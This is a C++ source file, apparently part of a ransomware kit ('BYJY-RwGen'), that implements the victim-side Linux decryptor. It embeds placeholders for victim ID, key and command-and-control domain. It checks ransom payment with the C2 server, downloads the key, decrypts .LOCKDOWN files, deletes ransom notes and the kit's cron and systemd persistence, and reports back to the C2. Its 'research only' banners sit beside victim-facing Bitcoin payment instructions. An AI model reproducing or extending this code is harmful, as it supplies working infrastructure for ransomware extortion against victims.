/**
 * BYJY-RwGen Linux Decryptor Template  
 * Cross-platform decryptor for research purposes
 * FOR RESEARCH ANALYSIS ONLY
 */

#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <thread>
#include <mutex>
#include <chrono>
#include <iomanip>
#include <sodium.h>
#include <curl/curl.h>
#include <jsoncpp/json/json.h>
#include <cstdlib>
#include <unistd.h>

namespace fs = std::filesystem;

// Embedded victim credentials (replaced at compile time)
const std::string VICTIM_ID = "{{VICTIM_ID}}";
const std::string ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}";
const std::string C2_DOMAIN = "{{C2_DOMAIN}}";

class LinuxVictimDecryptor {
private:
    std::string master_key;
    std::string victim_id;
    std::string c2_domain;
    std::mutex progress_mutex;
    int files_processed = 0;
    int total_files = 0;
    
    struct MemoryStruct {
        char *memory;
        size_t size;
    };
    
public:
    LinuxVictimDecryptor() 
        : master_key(ENCRYPTION_KEY), victim_id(VICTIM_ID), c2_domain(C2_DOMAIN) {
        if (sodium_init() < 0) {
            throw std::runtime_error("Failed to initialize libsodium");
        }
        curl_global_init(CURL_GLOBAL_DEFAULT);
    }
    
    ~LinuxVictimDecryptor() {
        curl_global_cleanup();
    }
    
    void showWelcomeMessage() {
        std::cout << "╔══════════════════════════════════════════════════════════════════╗\n";
        std::cout << "║                    AUTHORIZED FILE RECOVERY                      ║\n";
        std::cout << "║                                                                  ║\n";
        std::cout << "║  Payment has been verified. Your files will now be recovered.   ║\n";
        std::cout << "║  This process may take several minutes depending on file count.  ║\n";
        std::cout << "║                                                                  ║\n";
        std::cout << "║  FOR RESEARCH PURPOSES - ACADEMIC STUDY ONLY                    ║\n";
        std::cout << "╚══════════════════════════════════════════════════════════════════╝\n\n";
        
        std::cout << "Victim ID: " << victim_id << "\n";
        std::cout << "Recovery initiated at: " << getCurrentTimeString() << "\n\n";
    }
    
    bool verifyPaymentWithC2() {
        std::cout << "[1/5] Verifying payment status with C&C server...\n";
        
        try {
            std::string verification_url = "http://" + c2_domain + "/c2_server/api/verify_payment.php";
            std::string post_data = "victim_id=" + victim_id;
            
            std::string response = makeHttpRequest(verification_url, post_data);
            
            if (response.empty()) {
                std::cout << "✗ Failed to contact verification server\n";
                return false;
            }
            
            // Parse JSON response
            Json::Value json_response;
            Json::Reader reader;
            
            if (!reader.parse(response, json_response)) {
                std::cout << "✗ Invalid response from verification server\n";
                return false;
            }
            
            bool payment_verified = json_response["payment_verified"].asBool();
            std::string status = json_response["status"].asString();
            
            if (payment_verified) {
                std::cout << "✓ Payment verified successfully\n";
                std::cout << "✓ Decryption authorized by C&C server\n";
                std::cout << "✓ Transaction ID: " << json_response["transaction_id"].asString() << "\n\n";
                return true;
            } else {
                std::cout << "✗ Payment not verified: " << status << "\n";
                std::cout << "Please ensure payment has been sent and confirmed (minimum 1 confirmation)\n";
                return false;
            }
            
        } catch (const std::exception& e) {
            std::cout << "✗ Payment verification error: " << e.what() << "\n";
            return false;
        }
    }
    
    bool downloadLatestDecryptionKey() {
        std::cout << "[2/5] Downloading latest decryption key...\n";
        
        try {
            std::string key_url = "http://" + c2_domain + "/c2_server/api/get_decryption_key.php";
            std::string post_data = "victim_id=" + victim_id;
            
            std::string response = makeHttpRequest(key_url, post_data);
            
            if (response.empty()) {
                std::cout << "✗ Failed to download decryption key\n";
                return false;
            }
            
            Json::Value json_response;
            Json::Reader reader;
            
            if (!reader.parse(response, json_response)) {
                std::cout << "✗ Invalid key response\n";
                return false;
            }
            
            if (json_response["success"].asBool()) {
                master_key = json_response["decryption_key"].asString();
                std::cout << "✓ Decryption key updated successfully\n\n";
                return true;
            } else {
                std::cout << "✗ Failed to get decryption key: " << json_response["error"].asString() << "\n";
                return false;
            }
            
        } catch (const std::exception& e) {
            std::cout << "✗ Key download error: " << e.what() << "\n";
            return false;
        }
    }
    
    std::vector<fs::path> findEncryptedFiles() {
        std::cout << "[3/5] Scanning for encrypted files...\n";
        
        std::vector<fs::path> encrypted_files;
        std::vector<std::string> search_paths = {
            "/home",
            "/tmp",
            "/var/tmp",
            "/opt"
        };
        
        // Add user home directory
        const char* home = getenv("HOME");
        if (home) {
            search_paths.insert(search_paths.begin(), std::string(home));
        }
        
        int dirs_scanned = 0;
        for (const auto& path : search_paths) {
            if (!fs::exists(path)) continue;
            
            try {
                for (const auto& entry : fs::recursive_directory_iterator(path)) {
                    if (entry.is_regular_file()) {
                        auto filepath = entry.path();
                        if (filepath.extension() == ".LOCKDOWN") {
                            encrypted_files.push_back(filepath);
                        }
                    }
                }
                dirs_scanned++;
            } catch (const std::exception& e) {
                // Skip inaccessible directories
                continue;
            }
        }
        
        total_files = encrypted_files.size();
        std::cout << "✓ Scanned " << dirs_scanned << " directories\n";
        std::cout << "✓ Found " << total_files << " encrypted files\n\n";
        
        return encrypted_files;
    }
    
    bool decryptAllFiles(const std::vector<fs::path>& files) {
        std::cout << "[4/5] Decrypting files...\n";
        
        if (files.empty()) {
            std::cout << "No encrypted files found to decrypt.\n";
            return true;
        }
        
        // Notify C&C server that decryption started
        notifyDecryptionStarted(files.size());
        
        // Create progress display thread
        std::thread progress_thread(&LinuxVictimDecryptor::showProgress, this);
        
        // Multi-threaded decryption
        std::vector<std::thread> workers;
        const int num_threads = std::min(4, (int)std::thread::hardware_concurrency());
        const int files_per_thread = files.size() / num_threads + 1;
        
        std::vector<int> thread_success_count(num_threads, 0);
        std::vector<int> thread_failure_count(num_threads, 0);
        
        for (int i = 0; i < num_threads; ++i) {
            int start_idx = i * files_per_thread;
            int end_idx = std::min((int)files.size(), start_idx + files_per_thread);
            
            if (start_idx < end_idx) {
                auto file_range = std::vector<fs::path>(files.begin() + start_idx, files.begin() + end_idx);
                workers.emplace_back(&LinuxVictimDecryptor::decryptFileRange, this, 
                                   file_range, std::ref(thread_success_count[i]), std::ref(thread_failure_count[i]));
            }
        }
        
        // Wait for all threads to complete
        for (auto& worker : workers) {
            worker.join();
        }
        
        // Stop progress thread
        progress_thread.detach();
        
        // Calculate totals
        int total_success = 0, total_failures = 0;
        for (int i = 0; i < num_threads; ++i) {
            total_success += thread_success_count[i];
            total_failures += thread_failure_count[i];
        }
        
        std::cout << "\n✓ Decryption completed\n";
        std::cout << "  Files successfully decrypted: " << total_success << "\n";
        std::cout << "  Files failed to decrypt: " << total_failures << "\n\n";
        
        // Notify C&C server of completion
        notifyDecryptionCompleted(total_success, total_failures);
        
        return total_success > 0;
    }
    
    void performSystemCleanup() {
        std::cout << "[5/5] Performing system cleanup...\n";
        
        // Remove ransom notes
        int notes_removed = 0;
        std::vector<std::string> ransom_note_names = {
            "HOW_TO_DECRYPT_FILES.txt",
            "RECOVERY_INSTRUCTIONS.txt", 
            "READ_ME_FOR_DECRYPT.txt",
            "LOCKDOWN_NOTICE.txt",
            "FILES_ENCRYPTED.txt"
        };
        
        std::vector<std::string> search_paths = {"/home", "/tmp", "/var/tmp", "/opt"};
        const char* home = getenv("HOME");
        if (home) {
            search_paths.insert(search_paths.begin(), std::string(home));
        }
        
        for (const auto& search_path : search_paths) {
            if (!fs::exists(search_path)) continue;
            
            for (const auto& note_name : ransom_note_names) {
                fs::path ransom_path = fs::path(search_path) / note_name;
                if (fs::exists(ransom_path)) {
                    try {
                        fs::remove(ransom_path);
                        notes_removed++;
                    } catch (...) {}
                }
            }
        }
        
        // Remove persistence mechanisms (Linux-specific)
        int persistence_removed = cleanupLinuxPersistence();
        
        // Notify cleanup completion
        notifyCleanupCompleted(notes_removed, 0, 0, persistence_removed);
        
        std::cout << "✓ System cleanup completed\n";
        std::cout << "  Ransom notes removed: " << notes_removed << "\n";
        std::cout << "  Persistence mechanisms removed: " << persistence_removed << "\n\n";
    }
    
    void displayCompletionMessage() {
        std::cout << "╔══════════════════════════════════════════════════════════════════╗\n";
        std::cout << "║                     RECOVERY COMPLETED                           ║\n";
        std::cout << "║                                                                  ║\n";
        std::cout << "║  ✓ All files have been successfully decrypted                   ║\n";
        std::cout << "║  ✓ System has been cleaned of all malicious components         ║\n";
        std::cout << "║  ✓ Your system is now safe to use normally                     ║\n";
        std::cout << "║                                                                  ║\n";
        std::cout << "║  Files processed: " << std::setw(6) << total_files << "                                 ║\n";
        std::cout << "║  Recovery time: " << getCurrentTimeString() << "                        ║\n";
        std::cout << "║                                                                  ║\n";
        std::cout << "║  SECURITY RECOMMENDATIONS:                                      ║\n";
        std::cout << "║  • Update your system and run security scans                   ║\n";
        std::cout << "║  • Install latest security patches                             ║\n";
        std::cout << "║  • Backup your important files regularly                       ║\n";
        std::cout << "║  • Be cautious with downloads and email attachments           ║\n";
        std::cout << "║  • Consider using additional security tools                    ║\n";
        std::cout << "║                                                                  ║\n";
        std::cout << "║  This was a cybersecurity research simulation.                 ║\n";
        std::cout << "║  Thank you for your participation.                             ║\n";
        std::cout << "╚══════════════════════════════════════════════════════════════════╝\n\n";
        
        std::cout << "Press Enter to exit...\n";
        std::cin.get();
    }

private:
    static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
        size_t realsize = size * nmemb;
        struct MemoryStruct *mem = (struct MemoryStruct *)userp;
        
        char *ptr = (char*)realloc(mem->memory, mem->size + realsize + 1);
        if (!ptr) {
            return 0;
        }
        
        mem->memory = ptr;
        memcpy(&(mem->memory[mem->size]), contents, realsize);
        mem->size += realsize;
        mem->memory[mem->size] = 0;
        
        return realsize;
    }
    
    std::string makeHttpRequest(const std::string& url, const std::string& post_data = "") {
        CURL *curl;
        CURLcode res;
        struct MemoryStruct chunk;
        
        chunk.memory = (char*)malloc(1);
        chunk.size = 0;
        
        curl = curl_easy_init();
        if (!curl) {
            free(chunk.memory);
            return "";
        }
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        
        if (!post_data.empty()) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
        }
        
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        
        std::string result;
        if (res == CURLE_OK && chunk.memory) {
            result = std::string(chunk.memory);
        }
        
        free(chunk.memory);
        return result;
    }
    
    void decryptFileRange(const std::vector<fs::path>& files, int& success_count, int& failure_count) {
        for (const auto& encrypted_file : files) {
            try {
                decryptSingleFile(encrypted_file);
                success_count++;
                
                // Update progress
                {
                    std::lock_guard<std::mutex> lock(progress_mutex);
                    files_processed++;
                }
                
            } catch (const std::exception& e) {
                failure_count++;
                continue;
            }
        }
    }
    
    void decryptSingleFile(const fs::path& encrypted_file) {
        // Read encrypted file
        std::ifstream file(encrypted_file, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Cannot open encrypted file");
        }
        
        std::vector<unsigned char> encrypted_data(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>()
        );
        file.close();
        
        if (encrypted_data.empty()) {
            throw std::runtime_error("Empty encrypted file");
        }
        
        // Decrypt file content
        auto decrypted_data = performDecryption(encrypted_data);
        
        // Determine original filename (remove .LOCKDOWN extension)
        fs::path original_file = encrypted_file;
        original_file.replace_extension("");
        
        // Write decrypted file
        std::ofstream output_file(original_file, std::ios::binary);
        if (!output_file) {
            throw std::runtime_error("Cannot create decrypted file");
        }
        
        output_file.write(
            reinterpret_cast<const char*>(decrypted_data.data()),
            decrypted_data.size()
        );
        output_file.close();
        
        // Verify decrypted file was written successfully
        if (!fs::exists(original_file) || fs::file_size(original_file) != decrypted_data.size()) {
            throw std::runtime_error("Failed to write decrypted file");
        }
        
        // Remove encrypted version only after successful decryption
        fs::remove(encrypted_file);
    }
    
    std::vector<unsigned char> performDecryption(const std::vector<unsigned char>& ciphertext) {
        if (ciphertext.size() < crypto_aead_xchacha20poly1305_ietf_NPUBBYTES + crypto_aead_xchacha20poly1305_ietf_ABYTES) {
            throw std::runtime_error("Ciphertext too short");
        }
        
        // Extract nonce (last 24 bytes)
        size_t nonce_size = crypto_aead_xchacha20poly1305_ietf_NPUBBYTES;
        size_t ciphertext_len = ciphertext.size() - nonce_size;
        const unsigned char* nonce = ciphertext.data() + ciphertext_len;
        
        // Decrypt using XChaCha20-Poly1305
        std::vector<unsigned char> plaintext(ciphertext_len);
        unsigned long long plaintext_len;
        
        // Convert hex key to bytes
        std::vector<unsigned char> key_bytes;
        for (size_t i = 0; i < master_key.length(); i += 2) {
            std::string byte_str = master_key.substr(i, 2);
            key_bytes.push_back((unsigned char)strtol(byte_str.c_str(), nullptr, 16));
        }
        
        if (key_bytes.size() != crypto_aead_xchacha20poly1305_ietf_KEYBYTES) {
            throw std::runtime_error("Invalid key size");
        }
        
        if (crypto_aead_xchacha20poly1305_ietf_decrypt(
            plaintext.data(), &plaintext_len,
            nullptr,
            ciphertext.data(), ciphertext_len,
            nullptr, 0,
            nonce,
            key_bytes.data()
        ) != 0) {
            throw std::runtime_error("Decryption failed - invalid key or corrupted file");
        }
        
        plaintext.resize(plaintext_len);
        return plaintext;
    }
    
    void showProgress() {
        auto start_time = std::chrono::steady_clock::now();
        
        while (files_processed < total_files) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            
            {
                std::lock_guard<std::mutex> lock(progress_mutex);
                if (total_files > 0) {
                    int percentage = (files_processed * 100) / total_files;
                    std::cout << "\rProgress: [";
                    
                    int bar_width = 40;
                    int filled = (percentage * bar_width) / 100;
                    
                    for (int i = 0; i < bar_width; ++i) {
                        if (i < filled) std::cout << "█";
                        else std::cout << "░";
                    }
                    
                    std::cout << "] " << percentage << "% (" 
                              << files_processed << "/" << total_files << ") ";
                    
                    // Estimate time remaining
                    if (files_processed > 0) {
                        auto now = std::chrono::steady_clock::now();
                        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
                        float rate = (float)files_processed / (float)elapsed;
                        int remaining_files = total_files - files_processed;
                        int eta_seconds = (int)(remaining_files / rate);
                        std::cout << "ETA: " << eta_seconds/60 << ":" << std::setfill('0') << std::setw(2) << eta_seconds%60;
                    }
                }
            }
        }
    }
    
    int cleanupLinuxPersistence() {
        int cleaned = 0;
        
        // Remove cron jobs
        std::vector<std::string> cron_commands = {
            "crontab -l | grep -v 'system_update' | crontab -",
            "crontab -l | grep -v 'security_check' | crontab -"
        };
        
        for (const auto& cmd : cron_commands) {
            if (system(cmd.c_str()) == 0) {
                cleaned++;
            }
        }
        
        // Remove systemd services
        std::vector<std::string> service_files = {
            "/etc/systemd/system/system-update.service",
            "/etc/systemd/system/security-check.service",
            "/home/" + std::string(getenv("USER") ?: "user") + "/.config/systemd/user/backup-service.service"
        };
        
        for (const auto& service_file : service_files) {
            if (fs::exists(service_file)) {
                try {
                    fs::remove(service_file);
                    cleaned++;
                } catch (...) {}
            }
        }
        
        // Remove startup scripts
        std::vector<std::string> startup_files = {
            "/etc/init.d/system-update",
            "/etc/rc.local.backup"
        };
        
        for (const auto& startup_file : startup_files) {
            if (fs::exists(startup_file)) {
                try {
                    fs::remove(startup_file);
                    cleaned++;
                } catch (...) {}
            }
        }
        
        return cleaned;
    }
    
    void notifyDecryptionStarted(int file_count) {
        try {
            std::string notify_url = "http://" + c2_domain + "/c2_server/api/notify_decryption.php";
            std::string post_data = "victim_id=" + victim_id + "&status=started&file_count=" + std::to_string(file_count);
            makeHttpRequest(notify_url, post_data);
        } catch (...) {}
    }
    
    void notifyDecryptionCompleted(int success_count, int failure_count) {
        try {
            std::string notify_url = "http://" + c2_domain + "/c2_server/api/notify_decryption.php";
            std::string post_data = "victim_id=" + victim_id + "&status=completed&success=" + 
                                  std::to_string(success_count) + "&failures=" + std::to_string(failure_count);
            makeHttpRequest(notify_url, post_data);
        } catch (...) {}
    }
    
    void notifyCleanupCompleted(int notes_removed, int registry_cleaned, int tasks_removed, int startup_cleaned) {
        try {
            std::string notify_url = "http://" + c2_domain + "/c2_server/api/notify_cleanup.php";
            std::string post_data = "victim_id=" + victim_id + "&notes_removed=" + std::to_string(notes_removed) +
                                  "&registry_cleaned=" + std::to_string(registry_cleaned) + 
                                  "&tasks_removed=" + std::to_string(tasks_removed) +
                                  "&startup_cleaned=" + std::to_string(startup_cleaned);
            makeHttpRequest(notify_url, post_data);
        } catch (...) {}
    }
    
    std::string getCurrentTimeString() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
        return ss.str();
    }
};

int main(int argc, char* argv[]) {
    try {
        LinuxVictimDecryptor decryptor;
        
        // Enhanced recovery process
        decryptor.showWelcomeMessage();
        
        if (!decryptor.verifyPaymentWithC2()) {
            std::cout << "Payment verification failed. Please ensure:\n";
            std::cout << "• Payment has been sent to the correct Bitcoin address\n";
            std::cout << "• Transaction has at least 1 confirmation\n";
            std::cout << "• Payment amount is correct\n";
            std::cout << "\nContact support if payment was sent correctly.\n";
            return 1;
        }
        
        if (!decryptor.downloadLatestDecryptionKey()) {
            std::cout << "Failed to retrieve decryption key. Please contact support.\n";
            return 1;
        }
        
        auto encrypted_files = decryptor.findEncryptedFiles();
        
        if (!decryptor.decryptAllFiles(encrypted_files)) {
            std::cout << "Decryption process failed. Please contact support.\n";
            return 1;
        }
        
        decryptor.performSystemCleanup();
        decryptor.displayCompletionMessage();
        
        return 0;
        
    } catch (const std::exception& e) {
        std::cout << "Critical error: " << e.what() << "\n";
        std::cout << "Please contact support for assistance.\n";
        return 1;
    }
}